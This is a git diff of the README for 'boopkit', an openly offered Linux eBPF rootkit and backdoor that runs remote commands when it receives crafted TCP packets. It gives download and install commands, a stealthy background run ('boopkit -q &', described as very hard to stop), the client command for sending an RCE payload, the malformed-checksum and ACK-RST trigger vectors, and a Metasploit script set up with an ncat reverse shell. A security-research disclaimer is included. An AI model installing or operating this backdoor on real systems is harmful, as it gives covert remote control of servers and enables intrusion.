@@ -1,4 +1,4 @@
-# Boopkit
+![Screenshot from 2022-04-18 12-24-15](https://user-images.githubusercontent.com/13757818/163839421-a575dda4-6711-4437-ad43-1534a168e891.png)
 
 Linux backdoor, rootkit, and eBPF bypass tools.
 Remote command execution over raw TCP.
@@ -11,8 +11,6 @@ Remote command execution over raw TCP.
 
 ##### Disclaimer
 
-Under active development! 
-
 > This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
 > I am a professional security researcher. These are white hat tools used for research purposes only.
 > Use this responsibly. Never use this software illegally.
@@ -22,9 +20,9 @@ Under active development!
 Download and build boopkit.
 
 ```bash
-wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.0.5.tar.gz
-tar -xzf v1.0.5.tar.gz 
-cd boopkit-1.0.5/
+wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.2.0.tar.gz
+tar -xzf v1.2.0.tar.gz 
+cd boopkit-1.2.0/
 make
 sudo make install
 ```
@@ -36,22 +34,23 @@ Run boopkit in the foreground.
 boopkit -x 127.0.0.1 -x 10.0.0.1
 ```
 
-Run boopkit in the background without output
+Run boopkit in the background in quiet mode.
 
 ```bash 
 # Danger! This can be VERY hard to stop! Run this at your own risk!
-boopkit &> /dev/null &
+boopkit -q &
 ```
 
-Boopkit is now running and will automatically try to reverse connect to any source that is booping the server!
+Boopkit is now running and can be exploited using the client `boopkit-boop` command line tool.
 
 ## Client Side
 
 Download and build boopkit.
 
 ```bash
-git clone https://github.com/kris-nova/boopkit.git
-cd boopkit
+wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.2.0.tar.gz
+tar -xzf v1.2.0.tar.gz 
+cd boopkit-1.2.0/
 make
 sudo make install
 ```
@@ -70,15 +69,10 @@ boopkit-boop \
   -lport $LPORT \
   -rhost $RHOST \
   -rport $RPORT \
-  -x "$RCE"
+  -c "$RCE"
 ```
 
-# DPI
-
-  - Option 1: Fuck around with XDP/pcap
-  - Option 2: Just use pcap
-
-# Remote Vectors
+# Boop Vectors
 
 Boopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.
 
@@ -109,7 +103,11 @@ TCP Header Format. Taken from [RFC 793](https://datatracker.ietf.org/doc/html/rf
 
 ### 1. Bad Checksum
 
-First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. In theory this would work against a server that has no TCP services listening!
+First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. This works against any Linux server running boopkit, regardless of the state of TCP services.
+
+Use `-p` with `boopkit-boop` to only use this first vector.
+
+⚠️ Some modern network hardware will DROP all malformed checksum packets such as the one required to exploit boopkit using this vector!
 
 ### 2. Sending ACK-RST packet
 
@@ -125,13 +123,11 @@ Boopkit will try both, by default.
 The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed locally.
 
 ```bash
-# Remote values
 RHOST="127.0.0.1"
 RPORT="22"
-# Local values
 LHOST="127.0.0.1"
 LPORT="3535"
-# NetCat Reverse Shell Values
+
 NCAT="/usr/bin/ncat"
 NCATLISTENPORT="3545"
 ```
